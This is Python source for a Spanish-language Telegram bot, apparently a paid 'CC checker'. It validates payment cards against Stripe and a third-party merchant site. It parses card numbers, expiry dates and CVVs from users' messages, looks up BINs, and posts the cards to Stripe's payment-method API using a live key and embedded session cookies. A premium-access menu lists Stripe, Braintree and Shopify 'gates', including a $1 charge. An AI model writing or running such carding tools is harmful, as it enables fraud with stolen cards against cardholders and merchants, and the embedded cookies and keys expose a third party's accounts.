╟ 𝗟𝗮 𝗸𝗲𝘆 {key_to_delete} 𝗻𝗼 𝗲𝘅𝗶𝘀𝘁𝗲, 𝗽𝗼𝗿 𝗹𝗼 𝘁𝗮𝗻𝘁𝗼 𝗻𝗼 𝘀𝗲 𝗽𝘂𝗲𝗱𝗲 𝗲𝗹𝗶𝗺𝗶𝗻𝗮𝗿.
╟ [🝂] 𝗗𝗲𝗹𝗲𝘁𝗲 𝗳𝗼𝗿
╟ {FIRST} [𝗦𝗲𝗹𝗹𝗲𝗿]
╟ [🝂] 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁:
╟ @DiegoAkk
╚═══════════════════════╝"""
)


@iniciar.message_handler(commands=["deleteuser"], commands_prefix=comand)
async def cmds(message: types.Message):
    contra = await message.reply('<b>ᴘʀᴏᴄᴇss: 🔴 Comprobando acceso 🔴</b>')
    time.sleep(1)
    user = message.from_user.id
    
    with open('admins1.txt', 'r') as file:
        if str(user) in file.read():
            await contra.edit_text('<b>Efectivamente tienes premium bb✅</b>')
        else:
            await contra.edit_text('❌ <b>No tienes acceso para utilizar este comando ❌ Contacta a</b> @DiegoAkk.')
            return str;
    
    FIRST = message.from_user.first_name
    m1 = await contra.edit_text(f"<b>💳Eliminando Usuario de la lista de premium: [🔴]</b>")
    m2 = await m1.edit_text(f"<b>Eliminando Usuario de la lista de premium: [🔴][🟡]</b>")
    time.sleep(2)
    m3 = await m2.edit_text(f"<b>Eliminando Usuario de la lista de premium: [🔴][🟡][🟢]</b>")
    params = message.text.split(' ')[1]
    if len(params) == 0:
        await message.reply("Por favor, ingresa un id de usuario para eliminar.")
        return
    key_to_delete = params.strip()

    # Leer las llaves válidas del archivo
    with open('admins.txt', 'r') as file:
        valid_keys9 = [line.strip() for line in file.readlines()]

    # Verificar si la llave a eliminar está en la lista de llaves válidas
    if key_to_delete in valid_keys9:
        # Eliminar la llave del archivo
        with open('admins.txt', 'w') as file:
            for key in valid_keys9:
                if key != key_to_delete:
                    file.write(f"{key}\n")
        await m3.edit_text(f"""
╔═══════════════════════╗
╟ ● 𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹 𝙪𝙨𝙚𝙧 𝗱𝗲𝗹𝗲𝘁𝗶𝗼𝗻 ✅
╟═══════════════════════╝
╟ [🝂] 𝗔𝗰𝘁𝗶𝗼𝗻: 
╟ 𝗟𝗮 𝗸𝗲𝘆 {key_to_delete} 𝗵𝗮 𝘀𝗶𝗱𝗼 𝗲𝗹𝗶𝗺𝗶𝗻𝗮𝗱𝗮 𝗱𝗲 𝗻𝘂𝗲𝘀𝘁𝗿𝗮 𝗯𝗮𝘀𝗲 𝗱𝗲 𝗱𝗮𝘁𝗼𝘀.
╟ [🝂] 𝗗𝗲𝗹𝗲𝘁𝗲 𝗳𝗼𝗿:
╟ {FIRST} [𝗦𝗲𝗹𝗹𝗲𝗿]
╟ [🝂] 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁:
╟ @DiegoAkk
╚═══════════════════════╝"""
        )
    else:
        await m3.edit_text(f"""
╔═══════════════════════╗
╟ ● 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝙪𝙨𝙚𝙧 𝗱𝗲𝗹𝗲𝘁𝗶𝗼𝗻 ❌
╟═══════════════════════╝
╟ [🝂] 𝗥𝗲𝗮𝘀𝗼𝗻: 
╟ 𝗟𝗮 𝗸𝗲𝘆 {key_to_delete} 𝗻𝗼 𝗲𝘅𝗶𝘀𝘁𝗲, 𝗽𝗼𝗿 𝗹𝗼 𝘁𝗮𝗻𝘁𝗼 𝗻𝗼 𝘀𝗲 𝗽𝘂𝗲𝗱𝗲 𝗲𝗹𝗶𝗺𝗶𝗻𝗮𝗿.
╟ [🝂] 𝗗𝗲𝗹𝗲𝘁𝗲 𝗳𝗼𝗿
╟ {FIRST} [𝗦𝗲𝗹𝗹𝗲𝗿]
╟ [🝂] 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁:
╟ @DiegoAkk
╚═══════════════════════╝"""
)
        
        

#@iniciar.callback_query_handler(text=["randomvalue_of10", "creador", "gate"])
#async def random_value(call: types.CallbackQuery):
#    if call.data == "creador":
  #      await call.message.answer("☘ 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁 ☘: @DiegoAkk")
 #   if call.data == "gate":
   #     await call.message.answer("""
#<b>🛠 𝗚𝗮𝘁𝗲𝘀 𝗱𝗲𝗹 𝗕𝗼𝘁 🛠 </b>

#🔵 [🝂] /auth: <b>Stripe Auth 1</b> | <b>Status: On ✅</b>       
#🟡 [🝂] /stp: <b>Stripe Auth 2</b> | <b>Status: Off</b> ❌
#🟢 [🝂] /ym: <b>Stripe Auth 3</b> | <b>Status: On ✅</b>
#🔴 [🝂] /pene: <b>Stripe Charged 1$</b> | <b>Status: On</b> ✅    
#🟣 [🝂] /ch: <b>Charged Choice | Status: On</b> ✅
#⚫ [🝂] /erly: <b>Stripe Auth 4</b> | <b>Status: On</b> ✅
#🟤 [🝂] /chk: <b>Braintree Auth </b> | <b>Status: On</b> ✅
#🟠 [🝂] /str <b>Shopify+Braintree</b> | <b>Status: On</b> ✅""")



    #elif call.data == "randomvalue_of10":
     #   await call.message.answer("❇𝗠𝗶 𝗖𝗮𝗻𝗮𝗹 𝗲𝘀 𝗲𝘀𝘁𝗲 𝗽𝗼𝗿 𝘀𝗶 𝗾𝘂𝗶𝗲𝗿𝗲𝘀 𝗲𝗻𝘁𝗿𝗮𝗿:𝟯: @BlacKBullCanal❇")
    #await call.answer()


########################## COMDANDO START ################################
def create_gates_buttonr():
    gates_button1 = InlineKeyboardButton("𝗖𝗼𝗺𝗮𝗻𝗱𝗼𝘀 @YoimiyaChkBot | Canal de refes: @yoimiyarefe", callback_data="tols")
    return gates_button1

# Función para crear el menú desplegable de "auth"
def create_auth_menur():
    auth_menu1 = InlineKeyboardMarkup(row_width=1)
    auth_button1 = InlineKeyboardButton("𝑻𝒐𝒐𝒍𝒔 𝑶𝒇 @YoimiyaChoBot| 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁: @DiegoAkk | 𝗖𝗮𝗻𝗮𝗹 𝗱𝗲 𝗥𝗲𝗳𝗲𝗿𝗲𝗻𝗰𝗶𝗮𝘀: @yoimiyarefes", callback_data="auth")
    return_button1 = InlineKeyboardButton("Return", callback_data="retur")
    auth_menu1.add(auth_button1, return_button1)
    return auth_menu1

# Función para crear el menú desplegable de "charged"
def create_charged_menur():
    charged_menu1 = InlineKeyboardMarkup(row_width=1)
    charged_button1 = InlineKeyboardButton("𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁: @DiegoAkk | 𝗖𝗮𝗻𝗮𝗹 𝗱𝗲 𝗥𝗲𝗳𝗲𝗿𝗲𝗻𝗰𝗶𝗮𝘀: @yoimiyarefes", callback_data="charged")
    return_button1 = InlineKeyboardButton("Return", callback_data="retur")
    charged_menu1.add(charged_button1, return_button1)
    return charged_menu1

# Función para ma1nejar el callback del botón "gates"
async def gates_callback_handlerr(callback_query: CallbackQuery, state: FSMContext):
    gates_menu1 = InlineKeyboardMarkup(row_width=1)
    auth_button1 = InlineKeyboardButton("Cmds", callback_data="cmds")
    charged_button1 = InlineKeyboardButton("Tools", callback_data="tool")
    gates_menu1.add(auth_button1, charged_button1)
    await callback_query.message.edit_reply_markup(reply_markup=gates_menu1)



# Función para manejar los callbacks de los menús desplegables de "auth" y "charged"
async def sub_menu_callback_handlerr(callback_query: CallbackQuery, state: FSMContext):
    if callback_query.data == "retur":
        # Si se selecciona "Return", se vuelve al menú anterior
        cmd_menu1 = InlineKeyboardMarkup(row_width=1)
        gates_button1 = create_gates_buttonr()
        cmd_menu1.add(gates_button1)
        await callback_query.message.edit_text(text="𝗖𝗼𝗺𝗮𝗻𝗱𝗼𝘀 @YoimiyaChkBot | Canal de refes: @yoimiyarefe", reply_markup=cmd_menu1)
    
    elif callback_query.data == "cmds":
        # Si se selecciona "Charged", se muestra el texto del menú desplegable de "charged"
        auth_text1 = """ ☘ 𝑪𝒐𝒎𝒎𝒂𝒏𝒅𝒔 ☘
━━━━━━━━━━━━━━
[🝂] /cmds ✅
[🝂] /gates ✅
━━━━━━━━━━━━━━
𝗕𝗼𝘁 𝗕𝘆: @DiegoAkk
"""
        try:
            await callback_query.message.edit_text(text=auth_text1, reply_markup=create_auth_menur())
        except MessageNotModified:
            pass
    elif callback_query.data == "tool":
        # Si se selecciona "Charged", se muestra el texto del menú desplegable de "charged"
        charged_text1 = """━━━━━━━━━━━━━━
𝑻𝒐𝒐𝒍𝒔 ⚒
━━━━━━━━━━━━━━
[🝂] /bin ✅
[🝂] /gen ✅
[🝂] /sk ✅
━━━━━━━━━━━━━━
𝗕𝗼𝘁 𝗕𝘆: @DiegoAkk
"""
        await callback_query.message.edit_text(text=charged_text1, reply_markup=create_auth_menur())
       
        try:
            await callback_query.message.edit_text(text=charged_text1, reply_markup=create_charged_menur())
        except MessageNotModified:
            pass

@iniciar.message_handler(commands=["cmds", "help", "start"], commands_prefix=comand)
async def cmd_handler(message: Message):
    cmd_menu1 = InlineKeyboardMarkup(row_width=1)
    gates_button1 = create_gates_buttonr()
    cmd_menu1.add(gates_button1)
    await message.answer('𝗖𝗼𝗺𝗮𝗻𝗱𝗼𝘀 @YoimiyaChkBot | Canal de refes: @yoimiyarefes', reply_markup=cmd_menu1)

# Registro de los handlers
# Registro de los handlers
iniciar.register_message_handler(cmd_handler, commands=["cmds", "*", "/cmds", ".cmds"])
iniciar.register_callback_query_handler(gates_callback_handlerr, text="tols")
iniciar.register_callback_query_handler(sub_menu_callback_handlerr, text="cmds", state="*")
iniciar.register_callback_query_handler(sub_menu_callback_handlerr, text="tool", state="*")
iniciar.register_callback_query_handler(sub_menu_callback_handlerr, text="retur", state="*")
                      
########################## FIN COMANDO CMDS ################################




########################## COMDANDO GATES ################################
#################

@iniciar.message_handler(commands=['bin'], commands_prefix=comand)
async def helpstr(message: types.Message):
    await message.answer_chat_action("typing")
    BIN = message.text[len("/bin "): 11]
    if len(BIN) < 6:
        return await message.reply("<b>Ingresa el bin asi</b>: /bin 431231")
    if not BIN:
        return await message.reply("Did u Really Know how to use me.")
    bin1 = await message.reply(f"<b>💳CHEKEANDO BIN: {BIN}\nᴄᴀʀɢᴀɴᴅᴏ: [20%]</b>")
    apis1 = uniproxy.get(f"https://projectslost.xyz/bin/?bin={BIN}").json()
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    result=apis1['status']
    banke=apis1['bank']
    bank=banke['name']
    brand=apis1['brand']
    bn=apis1['query']
    typ=apis1['type']
    lv=apis1['level']
    country1=apis1['country']
    country=country1['name']
    
    
    bin2 = await bin1.edit_text(f"<b>💳CHEKEANDO BIN: {BIN}\nᴄᴀʀɢᴀɴᴅᴏ: [70%]</b>")
    time.sleep(3)
    bin3 = await bin2.edit_text(f"<b>💳CHEKEANDO BIN: {BIN}\nᴄᴀʀɢᴀɴᴅᴏ: [100%]</b>")
    if ID in owner:
         await bin3.edit_text(f"""
[ϟ] <b>Bin Lookup</b>
━━━━━━━━━━━━━
[Ϟ] <b>Bin</b>: <code>{bn}</code>
[Ϟ] <b>Vendor</b>: <code>{brand}</code>
[Ϟ] <b>Type</b>: <code>{typ}</code>
[Ϟ] <b>Level</b>: <code>{lv}</code>
[Ϟ] <b>Bank</b>: <code>{bank}</code>
[Ϟ] <b>Country</b>: <code>{country}</code>
━━━━━━━━━━━━━
<b>Checked By:</b> <a href="tg://user?id={ID}">{FIRST}</a> <b>[Owner]</b>
𝗕𝗼𝘁 𝗕𝘆: @DiegoAkk""")

    with open('admins.txt', 'r') as file:
        if str(ID) in file.read():
            await bin3.edit_text(f"""
[ϟ] <b>Bin Lookup</b>
━━━━━━━━━━━━━
[Ϟ] <b>Bin</b>: <code>{bn}</code>
[Ϟ] <b>Vendor</b>: <code>{brand}</code>
[Ϟ] <b>Type</b>: <code>{typ}</code>
[Ϟ] <b>Level</b>: <code>{lv}</code>
[Ϟ] <b>Bank</b>: <code>{bank}</code>
[Ϟ] <b>Country</b>: <code>{country}</code>
━━━━━━━━━━━━━
<b>Checked By:</b> <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
𝗕𝗼𝘁 𝗕𝘆: @DiegoAkk
""")

        else:
            await bin3.edit_text(f"""
[ϟ] <b>Bin Lookup</b>
━━━━━━━━━━━━━
[Ϟ] <b>Bin</b>: <code>{bn}</code>
[Ϟ] <b>Vendor</b>: <code>{brand}</code>
[Ϟ] <b>Type</b>: <code>{typ}</code>
[Ϟ] <b>Level</b>: <code>{lv}</code>
[Ϟ] <b>Bank</b>: <code>{bank}</code>
[Ϟ] <b>Country</b>: <code>{country}</code>
━━━━━━━━━━━━━
<b>Checked By:</b> <a href="tg://user?id={ID}">{FIRST}</a> <b>[Free]</b>
𝗕𝗼𝘁 𝗕𝘆: @DiegoAkk
""")



########################## FIN INFO BIN ################################



 ################## GATE AUTH ######################################   

@iniciar.message_handler(commands=["auth"], commands_prefix=comand)
async def auth(message: types.Message):
    contra = await message.reply("<b>ᴘʀᴏᴄᴇss: 🔴 Cargando 🔴</b>")
    time.sleep(1)
    user = message.from_user.id
    ini = time.perf_counter()

    if message.reply_to_message: 
        ccs = message.reply_to_message.text

    else: 
            ccs = message.text[len('/auth '):]
    
    if not ccs:
        await contra.edit_text("🔵 [🝂] /auth: <b>Stripe Auth 1</b> | <b>Status: Off ✅</b>")

    
    x = re.findall(r'\d+', ccs)
    cc = x[0]
    mes = x[1]                               
    ano = x[2]                               
    cvv = x[3]                               
    if mes.startswith('2'):
    	mes, ano = ano, mes                                                           
    if len(mes) >= 3:
        mes, ano, cvv = ano, cvv, mes
    
    m1 = await contra.edit_text(f"<b>💳ᴄᴀʀᴅ:{cc}|{mes}|{ano}|{cvv}\nᴘʀᴏᴄᴇss: [🔴]</b>")
    m2 = await m1.edit_text(f"<b>💳ᴄᴀʀᴅ: {cc}|{mes}|{ano}|{cvv}\nᴄʜᴇᴄᴋᴇᴀɴᴅᴏ ᴄᴄ: [🔴][🟡]</b>")
    time.sleep(2)
    m3 = await m2.edit_text(f"<b>💳ᴄᴀʀᴅ: {cc}|{mes}|{ano}|{cvv}\nᴄʜᴇᴄᴋᴇᴀɴᴅᴏ ᴄᴄ: [🔴][🟡][🟢]</b>")

    session = requests.session()

    apis17 = uniproxy.get(f"https://projectslost.xyz/bin/?bin={cc[:6]}").json()
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    result=apis17['status']
    banke=apis17['bank']
    bank=banke['name']
    brand=apis17['brand']
    bn=apis17['query']
    typ=apis17['type']
    lv=apis17['level']
    country1=apis17['country']
    country=country1['name']
    flag=country1['flag']

    final = time.perf_counter()
    
    headers = {
    'authority': 'api.stripe.com',
    'method': 'POST',
    'path': '/v1/payment_methods',
    'scheme': 'https',
    'accept': 'application/json',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'es-ES,es;q=0.9',
    'content-length': '404',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
#sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': 'Windows',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'
    }

    data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&billing_details[address][postal_code]=10080&guid=e97f7c39-c716-4d6f-9bcf-567d84a828419950f7&muid=68db696c-fd0b-4658-8845-4d4a90c87e1f400b8a&sid=127d4457-7c31-45ee-8887-7df6ebaba72691e05f&payment_user_agent=stripe.js%2F7a2397b1dd%3B+stripe-js-v3%2F7a2397b1dd&time_on_page=67975&key=pk_live_utMmIHlXwbC4V2qDh42rJJSt'

    api1 = session.post("https://api.stripe.com/v1/payment_methods", data=data, headers=headers).json()

    if 'id' not in api1:
        error = api1["error"]["code"]
        with open('admins.txt', 'r') as file:
                if str(ID) in file.read():
                    await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>{error}</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

                else:
                    await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>{error}</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Free]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

    else:
        idd = api1["id"]
        headels = {
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'es-ES,es;q=0.9',
        'Connection': 'keep-alive',
        'Content-Length': '53',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Cookie': '_gcl_au=1.1.319882170.1680262342; _ga=GA1.1.1541897969.1680262344; _fbp=fb.1.1680262344674.1387329671; intercom-id-kp3zr9lo=941915bf-9fbf-4cdc-a62c-0ac7d456c067; intercom-device-id-kp3zr9lo=e41912c9-9391-4506-8aeb-4058c49bebcd; cb_user_id=null; cb_group_id=null; cb_anonymous_id=%2262cfff6b-f3e9-4900-bb6c-a3e00b456c9b%22; __stripe_mid=68db696c-fd0b-4658-8845-4d4a90c87e1f400b8a; _hjSessionUser_2692709=eyJpZCI6IjE4ODU0ZmMwLWE5YzgtNTYwOC1hNWRkLTAzMmQ4ODQwNGI5ZSIsImNyZWF0ZWQiOjE2ODAyNjIzNDQ1MTQsImV4aXN0aW5nIjp0cnVlfQ==; remember_agency_user_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IlcxczFPRFkzWFN3aUpESmhKREV5SkRGaVJVWTRPRzVFV2xad2FEWnphVGhyU25SR2FYVWlMQ0l4Tmpnd01qWXlOREF3TGpFNE1EVXdPRGtpWFE9PSIsImV4cCI6IjIwMjMtMDQtMTRUMTE6MzM6MjAuMTgwWiIsInB1ciI6ImNvb2tpZS5yZW1lbWJlcl9hZ2VuY3lfdXNlcl90b2tlbiJ9fQ%3D%3D--41418bd478dc0abf548c8d8910e2d9106e10b5df; intercom-session-kp3zr9lo=R1c0UEkwWDBlOFM2YUtuU3BFUFV2QXRMYURreFdIeDJMWmRCVHhGQ0JKWDF4bk1OakJMZmt0d2ROZnRsVHh6eC0tblBJNzI1QWhXaHh3N1ZZVU5rVEdDdz09--f9170407300b1364616caec9910330ce1ce8650f; _hjIncludedInSessionSample_2692709=1; _hjSession_2692709=eyJpZCI6IjkxYzJmMDY3LWJhMTctNGMyNS1iODFmLWE0NWMxY2FlMGU3ZSIsImNyZWF0ZWQiOjE2ODAzMjgwOTUzNjAsImluU2FtcGxlIjp0cnVlfQ==; _hjIncludedInPageviewSample=1; _hjAbsoluteSessionInProgress=0; __stripe_sid=127d4457-7c31-45ee-8887-7df6ebaba72691e05f; _cms_session=CDA3uZ5X7U8ItdTMQQK%2BuFmWDB1t1mLI1r2AnV08AH73lEvGOALNAWXwCd%2BVwTBDcn7rAk%2BG0XBvkoGc4unheH80oovOSI6aJBH7Tg88xEzAKyhnhdD7YhMoWO%2BKf0SzohBcWwZAEW%2BzICImMsuhPLl5sOHkBC%2FQCTk5bwd4MJV57ME5O7garRaqmtJFogMIzms5DPU1uUNac3Z4pwGnwBBtDj%2FbwTIdqr2JKKmoF6Njpp8W%2FQBzVYDDybBfyO1ZJ9R9QyP7%2BxMFlfFBhrUQCMycHhvHetF2E8eIkVe%2B74iju5QwtUxwBvPSoA8MSOI1Qf71JnGCg0MWx7CufmS45J%2F%2FeoW%2F%2FxAmJUBm0EMVgKVR7HhVLNQbKlHw7U%2Blk%2F%2FG1Jsfi%2B3cnOV9dx8rdxKy2nVTizmzApGCJB6L7t3oOazAAJSskSpqX9S25XcHJle4zKEuAb6zqvqY7WLZEfha2EO0TbuwBjvIphBAPD1q3ApWNmqxY0qRCVLFks7QGc4SB%2FS96rT%2BBz1ZPx%2BMB%2BU1e2qK%2BIif5Yddxvnh0UofaHWMAxv%2F1WisbacIsYVG8aafWR5ljuy6%2F8zFw6LcCmfxq9Mw5iWKKniZdI61tgMaZPtsjNB1%2Fnj91u3ZvxIKI7bkx2V8ECeBShYZADkZuNM89pO%2BROrxhsdLbZXFBnDn4zG6sht%2Fa0z0SGpcqLcN%2Fypznr6NvoBCaiGGHWlHtGfqEC6B01aZyZn8odf0f4cKyMVfqlHW--QVnUTFZD3cQfvoIn--P4hezI7hLDVSILQ%2FwUf%2F6w%3D%3D; _ga_9Z3DFSWCQQ=GS1.1.1680328090.2.1.1680328132.18.0.0',
        'Host': 'app.uphex.com',
        'Origin': 'https://app.uphex.com',
        'Referer': 'https://app.uphex.com/subscription/new',
#sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': 'Windows',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest'


        }

        p2 = f'payment_method_id={idd}&coupon='

        api2 = session.post("https://app.uphex.com/subscription", headers=headels, data=p2)
        
        if "Your card was declined." in api2.text:
            with open('admins.txt', 'r') as file:
                if str(ID) in file.read():
                    await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Your card was declined.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

                else:
                    await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Your card was declined.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Free]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

        if "succeeded" in api2.text:
            with open('admins.txt', 'r') as file:
                if str(ID) in file.read():
                    await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬:<b>Approved</b> ✅
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Approved</b> ✅

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

                else:
                    await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Approved</b> ✅
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Approved</b> ✅

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Free]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")




@iniciar.message_handler(commands=['stp'], commands_prefix=comand)
async def da(message: types.Message):
    contra = await message.reply("<b>ᴘʀᴏᴄᴇss: 🔴 Comprobando acceso 🔴</b>")
    time.sleep(1)
    user = message.from_user.id
    with open('admins.txt', 'r') as file:
        if str(user) in file.read():
            await contra.edit_text('<b>Efectivamente tienes premium bb✅</b>')

        else:
            await contra.edit_text('❌ <b>No tienes acceso para utilizar este comando ❌ Contacta a</b> @DiegoAkk.')
            return str;
    ini = time.perf_counter()
    ccs = message.text[len('/stp '):]
    
    if not ccs:
        await contra.edit_text("<b>Gate Off ❌ | Reason: Me da paja arreglarlo xd</b>")



@iniciar.message_handler(commands=['pene'], commands_prefix=comand)  
async def pene(message: types.Message):
    contra = await message.reply("<b>ᴘʀᴏᴄᴇss: 🔴 Comprobando acceso 🔴</b>")
    time.sleep(1)
    user = message.from_user.id
    with open('admins.txt', 'r') as file:
        if str(user) in file.read():
            await contra.edit_text('<b>Efectivamente tienes premium bb✅</b>')

        else:
            await contra.edit_text('❌ <b>No tienes acceso para utilizar este comando ❌ Contacta a</b> @DiegoAkk.')
            return str;
    ini = time.perf_counter()

    if message.reply_to_message: 
        ccs = message.reply_to_message.text

    else:
        ccs = message.text[len('/pene '):]
    
    if not ccs:
        await contra.edit_text("🔴 [🝂] /pene: <b>Stripe Charged 1$</b> | <b>Status: On</b> ✅")
        return str
        
    
    x = re.findall(r'\d+', ccs)
    cc = x[0]
    mes = x[1]                               
    ano = x[2]                               
    cvv = x[3]                               
    if mes.startswith('2'):
        mes, ano = ano, mes                                                           
    if len(mes) >= 3:
        mes, ano, cvv = ano, cvv, mes
    
    m1 = await contra.edit_text(f"<b>💳ᴄᴀʀᴅ: {cc}|{mes}|{ano}|{cvv}\nᴘʀᴏᴄᴇss: [🔴]</b>")
    m2 = await m1.edit_text(f"<b>💳ᴄᴀʀᴅ: {cc}|{mes}|{ano}|{cvv}\nᴄʜᴇᴄᴋᴇᴀɴᴅᴏ ᴄᴄ: [🔴][🟡]</b>")
    time.sleep(2)
    m3 = await m2.edit_text(f"<b>💳ᴄᴀʀᴅ: {cc}|{mes}|{ano}|{cvv}\nᴄʜᴇᴄᴋᴇᴀɴᴅᴏ ᴄᴄ: [🔴][🟡][🟢]</b>")

    time.sleep(1)

    session = requests.session()
